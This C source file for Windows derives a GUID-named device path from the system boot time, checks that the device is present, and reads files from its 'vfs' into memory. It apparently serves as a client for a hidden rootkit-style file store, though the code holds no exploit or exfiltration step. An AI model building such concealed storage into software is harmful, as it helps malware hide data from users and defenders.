#include <windows.h>
#include <tchar.h>

#define		tczVfs			_T("vfs\\")

// Constant string length
#define		cstrlenA(x)		(sizeof(x)-1)
#define		cstrlenW(x)		((sizeof(x) / sizeof(WCHAR)) - 1)

#if _UNICODE
	#define	cstrlen(x)	cstrlenW(x)
#else
	#define	cstrlen(x)	cstrlenA(x)
#endif

HANDLE		g_VfsHandle	= 0;
LPTSTR		g_VfsRootName = NULL;

#define GUID_STR_LEN	16*2+4+2	// length of the GUID string in chars
#define tczGuidStrTempl	_T("{%08X-%04X-%04X-%04X-%08X%04X}")

#define	tczRoot			_T("\\\\.\\%s\\")

#define		WINERROR				ULONG	// WIN32 error code
#define		ERROR_UNSUCCESSFULL		(WINERROR)-1

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates pseudo random number based on the specified seed value.
//
ULONG MyRandom(PULONG pSeed)
{
	return(*pSeed = 1664525*(*pSeed)+1013904223);
}


static ULONG GetSystemTimeStamp(VOID)
{
	LARGE_INTEGER	Frequency;
	LARGE_INTEGER	SystemTime;
	LARGE_INTEGER	TickCount;
	ULONGLONG	SecElapsed, SecStarted;

	QueryPerformanceFrequency(&Frequency);
	QueryPerformanceCounter(&TickCount);
	GetSystemTimeAsFileTime((LPFILETIME)&SystemTime);

	// Calculating number of seconds elapsed since the system started
	SecElapsed = (ULONGLONG)TickCount.QuadPart / (ULONGLONG)Frequency.QuadPart;

	// Calculating number of seconds elapsed since January 1, 1601 (UTC) before the system started
	SecStarted = (ULONGLONG)SystemTime.QuadPart / 10000000 - SecElapsed;

	// Calculating number of 3-day intervals elapsed since January 1, 1601 (UTC) before the system started
	SecStarted /= (3600 * 24 * 3);

	return((ULONG)(SecStarted));
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates a GUID based on the specified seed value. The same seeds will create the same GUIDs on the same machine.
//
VOID GenGuid(GUID* pGuid, PULONG pSeed)
{
	ULONG i;
	pGuid->Data1 = MyRandom(pSeed);
	pGuid->Data2 = (USHORT)MyRandom(pSeed);
	pGuid->Data3 = (USHORT)MyRandom(pSeed);
	for (i=0; i<8; i++)
		pGuid->Data4[i] = (UCHAR)MyRandom(pSeed);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Converts the specified GUID structure into 0-terminated string.
//
LPTSTR GuidToString(GUID* pGuid)
{
	LPTSTR GuidStr = (LPTSTR)LocalAlloc( LMEM_FIXED, (GUID_STR_LEN+1)*sizeof(_TCHAR));
	if (GuidStr)
		wsprintf(GuidStr, tczGuidStrTempl, pGuid->Data1, pGuid->Data2, pGuid->Data3, *(USHORT*)&pGuid->Data4[0], *(ULONG*)&pGuid->Data4[2],  *(USHORT*)&pGuid->Data4[6]);

	return(GuidStr);
}


LPTSTR	CreateFsDeviceName(VOID)
{
	ULONG	SysTimeStamp;
	LPTSTR	GuidName, DeviceName = NULL;
	GUID	Guid;

	SysTimeStamp = GetSystemTimeStamp();

	GenGuid(&Guid, &SysTimeStamp);
	if (GuidName = GuidToString(&Guid))
	{
		if (DeviceName = (LPTSTR)LocalAlloc( LMEM_FIXED, (_tcslen(tczRoot) + GUID_STR_LEN + 1) * sizeof(_TCHAR)))
			wsprintf(DeviceName, tczRoot, GuidName);
		LocalFree(GuidName);		
	}

	g_VfsRootName = DeviceName;
	return(DeviceName);
}

BOOL IsFsPresent(VOID)
{
	BOOL	Ret = FALSE;
	HANDLE	hFile;

	hFile = CreateFile(g_VfsRootName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,  NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_DIRECTORY, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		Ret = TRUE;
	}
	return(Ret);
}

//
// Converst "vfs\"-based path into "Device\" - based path
//
LPTSTR	PathToDevice(LPTSTR	FilePath)
{
	ULONG	PathLen = (ULONG)_tcslen(FilePath);
	LPTSTR	DevicePath = NULL;
	LONG	NotVfs;
	if (DevicePath = (LPTSTR)LocalAlloc( LMEM_FIXED, (PathLen - cstrlen(tczVfs) + _tcslen(g_VfsRootName) + 1) * sizeof(_TCHAR)))
	{
		_tcscpy(DevicePath, g_VfsRootName);
		_tcscat(DevicePath, (LPTSTR)&FilePath[cstrlen(tczVfs)]);
	}	// if (DevicePath = malloc(
	return(DevicePath);
}

int CmdCopy( char* Source, char** data, int& c_data)
{
	int			Status = ERROR_UNSUCCESSFULL;
	HANDLE		hSource = 0, hDest = 0;
	LPTSTR		SourcePath, SourceDevice = NULL;
	ULONG		bRead, FileSize, NameLen, nFiles = 0;

	if (!(SourcePath = SourceDevice = PathToDevice(Source)))
		SourcePath = Source;

	do	// not a loop
	{
		hSource = CreateFile(SourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hSource == INVALID_HANDLE_VALUE)
		{
			break;
		}

		if (c_data = GetFileSize(hSource, NULL))
		{
			if (!(*data = (char*)VirtualAlloc(NULL, c_data, MEM_COMMIT, PAGE_READWRITE)))
			{
				break;
			}

			if (!ReadFile(hSource, *data, c_data, &bRead, NULL))
			{
				break;
			}

		}	// if (FileSize = GetFileSize(hSource, NULL))

		Status = NO_ERROR;
		nFiles = 1;
		
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (hSource)
		CloseHandle(hSource);

	if (SourceDevice)
		LocalFree(SourceDevice);

	return(Status);
}
